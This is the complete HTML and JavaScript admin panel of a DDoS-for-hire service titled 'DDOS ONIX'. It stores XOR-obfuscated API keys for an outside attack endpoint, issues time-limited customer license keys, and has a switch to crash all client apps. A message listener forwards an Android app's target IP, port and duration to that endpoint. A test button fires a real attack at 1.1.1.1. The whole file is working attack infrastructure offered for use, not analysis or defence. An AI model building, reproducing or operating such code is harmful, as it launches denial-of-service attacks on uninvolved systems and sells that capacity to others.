<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝐁𝐞𝐒𝐭𝐂𝐡𝐄𝐚𝐓 ✘ 𝐃𝐃𝐎𝐒 𝐎𝐍𝐈𝐗 ♪</title>
    <style>
        body { background-color: #0a0a0f; color: #fff; font-family: monospace; padding: 20px; }
        h2 { color: #00ff41; margin-bottom: 10px; font-size: 18px; text-transform: uppercase; letter-spacing: 1px;}
        input, textarea, button { background: #111; color: #fff; border: 1px solid #00ff41; padding: 12px; margin: 5px 0; width: 100%; box-sizing: border-box; border-radius: 5px; font-family: monospace; font-size: 14px;}
        textarea { resize: vertical; min-height: 60px; }
        button { cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { opacity: 0.8; }
        .danger { background: #ff003c; color: #fff; border: none; }
        .success { background: #00ff41; color: #000; border: none; }
        .warning { background: #ff9800; color: #000; border: none; }
        .info { background: #00e5ff; color: #000; border: none; }
        .box { border: 1px solid #333; padding: 20px; margin-bottom: 20px; border-radius: 8px; background: #111; box-shadow: 0 0 10px rgba(0, 255, 65, 0.1); }
        .hidden { display: none; }
        .key-item { border-bottom: 1px solid #333; padding: 15px; font-size: 13px; background: #1a1a24; border-radius: 5px; margin-bottom: 10px;}
        .green { color: #00ff41; }
        .red { color: #ff003c; }
        .cyan { color: #00e5ff; }
        .copy-btn { background: #00e5ff; color: #000; padding: 8px; font-size: 12px; border-radius: 3px; margin-top: 10px; width: auto; border: none; display: inline-block;}
        .btn-group { display: flex; gap: 10px; margin-top: 5px; }
        .btn-group button { margin: 0; }
        .lock-box { display: flex; justify-content: space-between; align-items: center; margin-top: 15px;}
        .switch { position: relative; display: inline-block; width: 60px; height: 34px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ff003c; transition: .4s; border-radius: 34px; }
        .slider:before { position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: #00ff41; }
        input:checked + .slider:before { transform: translateX(26px); }
    </style>
</head>
<body>

    <div id="loginBox" class="box">
        <h2>🔐 𝐀𝐃𝐌𝐈𝐍 𝐋𝐎𝐆𝐈𝐍</h2>
        <input type="password" id="adminPass" placeholder="𝐄𝐧𝐭𝐞𝐫 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝">
        <button onclick="login()">𝐋𝐎𝐆𝐈𝐍</button>
    </div>

    <div id="mainPanel" class="hidden">
        <div class="box">
            <h2>🌐 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐔𝐑𝐋</h2>
            <input type="text" id="dbUrl" placeholder="https://xxx.firebaseio.com/">
            <div class="btn-group">
                <button onclick="saveDb()" class="success">𝐒𝐀𝐕𝐄</button>
                <button onclick="updateDb()" class="warning">𝐔𝐏𝐃𝐀𝐓𝐄</button>
                <button onclick="deleteDb()" class="danger">𝐃𝐄𝐋𝐄𝐓𝐄</button>
            </div>
        </div>

        <div class="box">
            <h2>🔑 𝐀𝐏𝐈 𝐊𝐄𝐘𝐒 (𝟏𝟎 𝐒𝐋𝐎𝐓𝐒)</h2>
            <div id="apiSlots">
                <input type="text" id="apiKey1" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟏">
                <input type="text" id="apiKey2" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟐">
                <input type="text" id="apiKey3" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟑">
                <input type="text" id="apiKey4" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟒">
                <input type="text" id="apiKey5" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟓">
                <input type="text" id="apiKey6" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟔">
                <input type="text" id="apiKey7" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟕">
                <input type="text" id="apiKey8" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟖">
                <input type="text" id="apiKey9" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟗">
                <input type="text" id="apiKey10" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟏𝟎">
            </div>
            <div class="btn-group">
                <button onclick="saveApi()" class="success">𝐒𝐀𝐕𝐄 𝐀𝐏𝐈𝐬</button>
                <button onclick="updateApi()" class="warning">𝐔𝐏𝐃𝐀𝐓𝐄 𝐀𝐏𝐈𝐬</button>
                <button onclick="deleteApi()" class="danger">𝐃𝐄𝐋𝐄𝐓𝐄 𝐀𝐏𝐈𝐬</button>
            </div>
        </div>

        <div class="box">
            <h2>⚡ 𝐓𝐄𝐒𝐓 𝐀𝐏𝐈 𝐎𝐍𝐋𝐈𝐍𝐄</h2>
            <div id="apiTestButtons" style="margin-bottom: 10px; display: flex; flex-wrap: wrap; gap: 10px;"></div>
            <div id="apiTestResult" style="font-size: 14px; font-weight: bold; margin-top: 10px;"></div>
        </div>

        <div class="box">
            <h2>📢 𝐂𝐔𝐒𝐓𝐎𝐌 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐌𝐄𝐒𝐒𝐀𝐆𝐄</h2>
            <input type="text" id="notifTitle" placeholder="𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐢𝐭𝐥𝐞" value="𝐀𝐩𝐩 𝐋𝐨𝐜𝐤𝐞𝐝 𝐁𝐲 𝐎𝐰𝐧𝐞𝐫">
            <textarea id="notifMessage" placeholder="𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞" style="min-height: 80px;">𝐋𝐨𝐜𝐤 𝐀𝐩𝐩𝐥𝐲 𝐖𝐢𝐭𝐡𝐢𝐧 𝟏𝟎𝐬 ➪ 𝐀𝐠𝐚𝐫 𝐭𝐮𝐦 𝟏𝟎𝐬 𝐛𝐚𝐚𝐝 𝐨𝐩𝐞𝐧 𝐤𝐫𝐨𝐠𝐞 𝐭𝐨𝐡 𝐨𝐩𝐞𝐧 𝐧𝐚𝐡𝐢 𝐡𝐨𝐠𝐚!</textarea>
            <button onclick="saveNotif()" class="success">𝐒𝐀𝐕𝐄 & 𝐔𝐏𝐃𝐀𝐓𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄</button>
        </div>

        <div class="box">
            <h2>🛑 𝐀𝐏𝐏 𝐋𝐎𝐂𝐊 𝐒𝐓𝐀𝐓𝐔𝐒</h2>
            <div class="lock-box">
                <div id="lockStatusText" style="font-size: 16px; font-weight: bold; color: #00ff41;">𝐒𝐭𝐚𝐭𝐮𝐬 ➪ 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃</div>
                <label class="switch">
                    <input type="checkbox" id="lockSwitch" onchange="toggleKill()">
                    <span class="slider"></span>
                </label>
            </div>
            <div style="font-size: 11px; color: #888; margin-top: 10px;">𝐓𝐮𝐫𝐧 𝐎𝐍 𝐭𝐨 𝐜𝐫𝐚𝐬𝐡 𝐚𝐥𝐥 𝐮𝐬𝐞𝐫𝐬 𝐢𝐧𝐬𝐭𝐚𝐧𝐭𝐥𝐲.</div>
        </div>

        <div class="box">
            <h2>🔑 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐍𝐄𝐖 𝐊𝐄𝐘</h2>
            <input type="text" id="keyName" placeholder="𝐊𝐞𝐲 𝐍𝐚𝐦𝐞 (𝐞.𝐠. 𝐕𝐈𝐏-𝐔𝐒𝐄𝐑)">
            <input type="text" id="keyExpiry" placeholder="𝐄𝐱𝐩𝐢𝐫𝐲 (𝟏𝐦, 𝟏𝐡, 𝟏𝐝, 𝟕𝐝)">
            <button onclick="generateKey()" class="success">𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐊𝐄𝐘</button>
            <div id="newKeyDisplay" class="hidden" style="margin-top:15px; border:1px dashed #00ff41; padding:15px; background: #000;">
                <div id="newKeyText" style="white-space: pre-wrap; line-height: 1.5; color: #00e5ff;"></div>
                <button class="copy-btn" onclick="copyGeneratedKey()">📋 𝐂𝐎𝐏𝐘 𝐊𝐄𝐘 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</button>
            </div>
        </div>

        <div class="box">
            <h2>📋 𝐀𝐋𝐋 𝐊𝐄𝐘𝐒 & 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</h2>
            <button onclick="fetchKeys()" class="info">𝐑𝐄𝐅𝐑𝐄𝐒𝐇 𝐋𝐈𝐒𝐓</button>
            <div id="keyList" style="margin-top:15px;"></div>
        </div>
    </div>

    <script>
        // SECURITY: API Keys XOR + Base64 Obfuscation
        const SECRET_SALT = "VeilSecure2024"; 

        function encryptKey(key) {
            if (!key) return "";
            let result = "";
            for (let i = 0; i < key.length; i++) {
                result += String.fromCharCode(key.charCodeAt(i) ^ SECRET_SALT.charCodeAt(i % SECRET_SALT.length));
            }
            return btoa(result); 
        }

        function decryptKey(encryptedKey) {
            if (!encryptedKey) return "";
            try {
                const decoded = atob(encryptedKey);
                let result = "";
                for (let i = 0; i < decoded.length; i++) {
                    result += String.fromCharCode(decoded.charCodeAt(i) ^ SECRET_SALT.charCodeAt(i % SECRET_SALT.length));
                }
                return result;
            } catch (e) { return ""; }
        }

        const dbUrlInput = document.getElementById('dbUrl');
        dbUrlInput.value = localStorage.getItem('dbUrl') || '';
        let generatedKeyText = "";

        function login() {
            const pass = document.getElementById('adminPass').value;
            if (pass === "veil") { 
                document.getElementById('loginBox').classList.add('hidden');
                document.getElementById('mainPanel').classList.remove('hidden');
                fetchKillStatus();
                fetchKeys();
                fetchApis();
                fetchNotification();
            } else { alert("𝐖𝐫𝐨𝐧𝐠 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝"); }
        }

        async function saveDb() {
            const db = dbUrlInput.value.trim();
            if (!db) return alert("𝐄𝐧𝐭𝐞𝐫 𝐃𝐁 𝐔𝐑𝐋");
            if (!db.endsWith('/')) { dbUrlInput.value = db + '/'; }
            localStorage.setItem('dbUrl', dbUrlInput.value);
            await fetch(`${dbUrlInput.value}settings/config.json`, { method: 'PATCH', body: JSON.stringify({ db_url: dbUrlInput.value }) });
            alert("𝐃𝐁 𝐔𝐑𝐋 𝐒𝐚𝐯𝐞𝐝 & 𝐏𝐮𝐬𝐡𝐞𝐝 𝐭𝐨 𝐂𝐥𝐨𝐮𝐝!");
        }

        function updateDb() { saveDb(); alert("𝐃𝐁 𝐔𝐑𝐋 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐢𝐧 𝐂𝐥𝐨𝐮𝐝!"); }
        function deleteDb() {
            if(confirm("𝐃𝐞𝐥𝐞𝐭𝐞 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐔𝐑𝐋?")) { localStorage.removeItem('dbUrl'); dbUrlInput.value = ""; alert("𝐃𝐁 𝐔𝐑𝐋 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐋𝐨𝐜𝐚𝐥𝐥𝐲!"); }
        }

        async function saveApi() {
            const db = dbUrlInput.value;
            if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
            let updateData = {};
            for(let i=1; i<=10; i++) { 
                const plainKey = document.getElementById(`apiKey${i}`).value.trim();
                updateData[`api_key_${i}`] = plainKey ? encryptKey(plainKey) : "";
            }
            await fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify(updateData) });
            alert("𝐀𝐏𝐈𝐬 𝐄𝐧𝐜𝐫𝐲𝐩𝐭𝐞𝐝 & 𝐒𝐚𝐯𝐞𝐝 𝐭𝐨 𝐂𝐥𝐨𝐮𝐝!");
            fetchApis();
        }
        function updateApi() { saveApi(); }
        function deleteApi() {
            if(confirm("𝐂𝐥𝐞𝐚𝐫 𝐚𝐥𝐥 𝐀𝐏𝐈 𝐊𝐞𝐲𝐬?")) { for(let i=1; i<=10; i++) { document.getElementById(`apiKey${i}`).value = ""; } saveApi(); }
        }

        async function fetchApis() {
            const db = dbUrlInput.value;
            if (!db) return;
            try {
                const res = await fetch(`${db}settings/config.json`);
                const data = await res.json();
                const testBtnContainer = document.getElementById('apiTestButtons');
                testBtnContainer.innerHTML = "";
                if (data) {
                    for(let i=1; i<=10; i++) {
                        const encryptedVal = data[`api_key_${i}`] || "";
                        const decryptedVal = decryptKey(encryptedVal);
                        document.getElementById(`apiKey${i}`).value = decryptedVal;
                        
                        if(decryptedVal.trim() !== "") {
                            const btn = document.createElement('button');
                            btn.innerText = `𝐓𝐞𝐬𝐭 𝐀𝐏𝐈 𝐒𝐥𝐨𝐭 ${i}`;
                            btn.className = "info"; btn.style.width = "auto";
                            btn.onclick = () => testApi(decryptedVal, i);
                            testBtnContainer.appendChild(btn);
                        }
                    }
                }
            } catch(e) {}
        }

        // NO-CORS DIRECT FETCH (No Proxy)
        async function testApi(apiKey, slotNumber) {
            const resDiv = document.getElementById('apiTestResult');
            resDiv.innerHTML = `<span style="color:#00e5ff;">𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐒𝐥𝐨𝐭 ${slotNumber}... 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.</span>`;
            const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
            
            try {
                // direct no-cors call
                await fetch(targetUrl, { mode: 'no-cors' });
                
                // Since we can't read response due to CORS, we assume success if no network exception
                resDiv.innerHTML = `<span class="green">☑️ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐏𝐀𝐒𝐒 (𝐒𝐥𝐨𝐭 ${slotNumber} 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞)</span><br><small>Request sent to API successfully.</small>`;
            } catch (error) {
                resDiv.innerHTML = `<span class="red">❌ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐅𝐀𝐈𝐋 (𝐍𝐞𝐭𝐰𝐨𝐫𝐤 𝐄𝐫𝐫𝐨𝐫)</span>`;
            }
        }

        async function saveNotif() {
            const db = dbUrlInput.value;
            if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
            const title = document.getElementById('notifTitle').value;
            const message = document.getElementById('notifMessage').value;
            await fetch(`${db}settings/notification.json`, { method: 'PUT', body: JSON.stringify({ title: title, message: message }) });
            alert("𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐒𝐚𝐯𝐞𝐝!");
        }

        async function fetchNotification() {
            const db = dbUrlInput.value;
            if (!db) return;
            try {
                const res = await fetch(`${db}settings/notification.json`);
                const data = await res.json();
                if (data) {
                    document.getElementById('notifTitle').value = data.title || "𝐀𝐩𝐩 𝐋𝐨𝐜𝐤𝐞𝐝 𝐁𝐲 𝐎𝐰𝐧𝐞𝐫";
                    document.getElementById('notifMessage').value = data.message || "𝐋𝐨𝐜𝐤 𝐀𝐩𝐩𝐥𝐲 𝐖𝐢𝐭𝐡𝐢𝐧 𝟏𝟎𝐬...";
                }
            } catch(e) {}
        }

        async function toggleKill() {
            const db = dbUrlInput.value;
            if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
            const isChecked = document.getElementById('lockSwitch').checked;
            await fetch(`${db}settings/app_blocked.json`, { method: 'PUT', body: JSON.stringify(isChecked) });
            fetchKillStatus();
        }

        async function fetchKillStatus() {
            const db = dbUrlInput.value;
            if (!db) return;
            try {
                const res = await fetch(`${db}settings/app_blocked.json`);
                const status = await res.json();
                const statusText = document.getElementById('lockStatusText');
                const switchBtn = document.getElementById('lockSwitch');
                if (status === true) {
                    statusText.innerText = "𝐒𝐭𝐚𝐭𝐮𝐬 ➪ 𝐋𝐎𝐂𝐊𝐄𝐃 (𝐀𝐩𝐩 𝐂𝐫𝐚𝐬𝐡𝐞𝐝)"; statusText.style.color = "#ff003c"; switchBtn.checked = true;
                } else {
                    statusText.innerText = "𝐒𝐭𝐚𝐭𝐮𝐬 ➪ 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃"; statusText.style.color = "#00ff41"; switchBtn.checked = false;
                }
            } catch (e) {}
        }

        function formatTime(timestamp) {
            if (!timestamp || timestamp === 0) return "𝐍/𝐀";
            const d = new Date(timestamp);
            return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
        }

        async function generateKey() {
            const db = dbUrlInput.value;
            const name = document.getElementById('keyName').value;
            const expiry = document.getElementById('keyExpiry').value;
            if (!db || !name || !expiry) return alert("𝐅𝐢𝐥𝐥 𝐚𝐥𝐥 𝐟𝐢𝐞𝐥𝐝𝐬");

            let timeMs = 0;
            if (expiry.endsWith('m')) timeMs = parseInt(expiry) * 60000;
            else if (expiry.endsWith('h')) timeMs = parseInt(expiry) * 3600000;
            else if (expiry.endsWith('d')) timeMs = parseInt(expiry) * 86400000;

            const expiryTime = Date.now() + timeMs;
            await fetch(`${db}keys/${name}.json`, { method: 'PUT', body: JSON.stringify({ expiry: expiryTime, blocked: false, firstUsed: 0 }) });
            
            generatedKeyText = `🖤 ◆ 𝐊𝐞𝐲 ➪ ${name}\n👼 ◆ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 ➪ ${expiry}\n🍂 ◆ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐓𝐢𝐦𝐞 ➪ ${formatTime(Date.now())}\n🪼 ◆ 𝐄𝐱𝐩𝐢𝐫𝐲 𝐓𝐢𝐦𝐞 ➪ ${formatTime(expiryTime)}\n◆ 𝐍𝐨𝐭𝐞 ➪ 𝐄𝐱𝐩𝐢𝐫𝐲 𝐬𝐭𝐚𝐫𝐭𝐬 𝐰𝐡𝐞𝐧 𝐮𝐬𝐞𝐫 𝐥𝐨𝐠𝐬 𝐢𝐧 ◆`;
            
            document.getElementById('newKeyDisplay').classList.remove('hidden');
            document.getElementById('newKeyText').innerText = generatedKeyText;
            document.getElementById('keyName').value = '';
            fetchKeys();
        }

        function copyGeneratedKey() {
            navigator.clipboard.writeText(generatedKeyText).then(() => { alert("𝐊𝐞𝐲 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐂𝐨𝐩𝐢𝐞𝐝!"); });
        }

        async function fetchKeys() {
            const db = dbUrlInput.value;
            if (!db) return;
            try {
                const res = await fetch(`${db}keys.json`);
                const data = await res.json();
                let html = "";
                if (data) {
                    for (let key in data) {
                        const k = data[key];
                        const status = k.blocked ? "𝐁𝐋𝐎𝐂𝐊𝐄𝐃" : "𝐀𝐂𝐓𝐈𝐕𝐄";
                        const color = k.blocked ? "red" : "green";
                        const usedStatus = (k.firstUsed === 0 || k.firstUsed === undefined) ? "𝐍𝐎𝐓 𝐔𝐒𝐄𝐃 𝐘𝐄𝐓" : "𝐔𝐒𝐄𝐃";
                        const device = k.device || "𝐍𝐨𝐧𝐞";
                        
                        let timeLeft = "𝐍𝐨𝐭 𝐒𝐭𝐚𝐫𝐭𝐞𝐝";
                        if (k.firstUsed !== 0 && k.firstUsed !== undefined) {
                            const remaining = k.expiry - Date.now();
                            if (remaining > 0) timeLeft = Math.floor(remaining/1000) + "𝐬 𝐥𝐞𝐟𝐭";
                            else timeLeft = "𝐄𝐗𝐏𝐈𝐑𝐄𝐃";
                        }

                        html += `
                            <div class="key-item">
                                <b class="cyan">${key}</b> <br>
                                <span class="${color}">𝐒𝐓𝐀𝐓𝐔𝐒 ➪ ${status}</span> | <span class="green">${usedStatus}</span><br>
                                <b>𝐃𝐞𝐯𝐢𝐜𝐞 ➪</b> ${device}<br>
                                <b>𝐄𝐱𝐩𝐢𝐫𝐲 ➪</b> ${formatTime(k.expiry)}<br>
                                <b>𝐓𝐢𝐦𝐞 𝐋𝐞𝐟𝐭 ➪</b> ${timeLeft}<br>
                                <div class="btn-group">
                                    <button class="danger" style="padding:5px 10px; font-size:12px; margin-top:8px;" onclick="deleteKey('${key}')">𝐃𝐄𝐋𝐄𝐓𝐄</button>
                                    <button class="success" style="padding:5px 10px; font-size:12px; margin-top:8px;" onclick="toggleBlockKey('${key}', ${!k.blocked})">${k.blocked ? '𝐔𝐍𝐁𝐋𝐎𝐂𝐊' : '𝐁𝐋𝐎𝐂𝐊'}</button>
                                </div>
                            </div>
                        `;
                    }
                }
                document.getElementById('keyList').innerHTML = html || "𝐍𝐨 𝐤𝐞𝐲𝐬 𝐟𝐨𝐮𝐧𝐝.";
            } catch (e) {}
        }

        async function toggleBlockKey(key, blockStatus) {
            const db = dbUrlInput.value;
            await fetch(`${db}keys/${key}.json`, { method: 'PATCH', body: JSON.stringify({ blocked: blockStatus }) });
            fetchKeys();
        }

        async function deleteKey(key) {
            const db = dbUrlInput.value;
            if (confirm("𝐃𝐞𝐥𝐞𝐭𝐞 𝐭𝐡𝐢𝐬 𝐤𝐞𝐲 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲?")) {
                await fetch(`${db}keys/${key}.json`, { method: 'DELETE' });
                fetchKeys();
            }
        }

        // ==========================================
        // REAL APP CONNECTION LOGIC (NO-CORS DIRECT)
        // ==========================================
        window.addEventListener("message", async function(event) {
            if (event.data && event.data.action === "ATTACK") {
                const { ip, port, duration } = event.data;
                const db = dbUrlInput.value;
                
                if(!db) {
                    Android.onAttackResponse("ERROR", "Database URL not set in Panel");
                    return;
                }

                try {
                    const res = await fetch(`${db}settings/config.json`);
                    const data = await res.json();
                    
                    let apiKey = "";
                    if (data) {
                        for(let i=1; i<=10; i++) {
                            const encryptedVal = data[`api_key_${i}`];
                            if(encryptedVal && encryptedVal.trim() !== "") {
                                apiKey = decryptKey(encryptedVal);
                                if(apiKey) break;
                            }
                        }
                    }

                    if(!apiKey) {
                        Android.onAttackResponse("ERROR", "No Valid API Key Found in Panel");
                        return;
                    }

                    const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=${ip}&port=${port}&time=${duration}`;
                    
                    // Direct hit without proxy blocking!
                    await fetch(targetUrl, { mode: 'no-cors' });
                    
                    // Success response to app
                    Android.onAttackResponse("SUCCESS", "Attack Launched!");

                } catch(e) {
                    Android.onAttackResponse("ERROR", "Network Error");
                }
            }
        });
    </script>
</body>
